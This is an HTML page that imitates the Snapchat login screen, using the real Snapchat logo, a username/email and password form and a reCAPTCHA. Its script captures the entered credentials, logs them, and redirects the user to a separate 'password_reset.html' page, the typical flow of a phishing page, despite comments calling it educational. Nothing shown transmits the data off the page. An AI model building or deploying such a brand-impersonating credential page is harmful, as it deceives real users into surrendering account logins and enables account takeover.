<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Snapchat Login</title>
    <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        .error-message {
            color: red;
            margin-top: 5px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="form">
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
        <h1>Snapchat Login</h1>
        <form id="loginForm">
            <label for="username">Username or Email Address:</label><br>
            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br>
            <span id="usernameError" class="error-message"></span><br>
            
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" placeholder="Enter your password" required><br>
            <span id="passwordError" class="error-message"></span><br>
            
            <div class="g-recaptcha" data-sitekey="6LdyV_wpAAAAAO7dKxETuuFMa5ROZyZnfJ0O_DLG"></div>
            <span id="captchaError" class="error-message"></span><br>
            
            <input type="submit" value="Log In">
            <span id="loginError" class="error-message"></span><br>
        </form>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var recaptchaResponse = grecaptcha.getResponse();
            
            if (validateForm(username, password, recaptchaResponse)) {
                // Optional: Verify recaptchaResponse with your server-side logic
                // For educational purposes, the client-side check is shown here.
                if (recaptchaResponse.length === 0) {
                    document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
                    return;
                }
                
                // Log the username and password (for demonstration purposes only)
                console.log('Logging in:', username, password);
                
                // Redirect to password reset page (for demonstration purposes only)
                window.location.href = "password_reset.html";
            }
        });
        
        function validateForm(username, password, recaptchaResponse) {
            var isValid = true;
            
            // Reset error messages
            document.getElementById('usernameError').textContent = '';
            document.getElementById('passwordError').textContent = '';
            document.getElementById('loginError').textContent = '';
            document.getElementById('captchaError').textContent = '';
            
            // Validate username
            if (!username.trim()) {
                document.getElementById('usernameError').textContent = 'Username or email is required';
                isValid = false;
            }
            
            // Validate password
            if (!password.trim()) {
                document.getElementById('passwordError').textContent = 'Password is required';
                isValid = false;
            }
            
            // Validate reCAPTCHA
            if (recaptchaResponse.length === 0) {
                document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
                isValid = false;
            }
            
            return isValid;
        }
    </script>
</body>
</html>
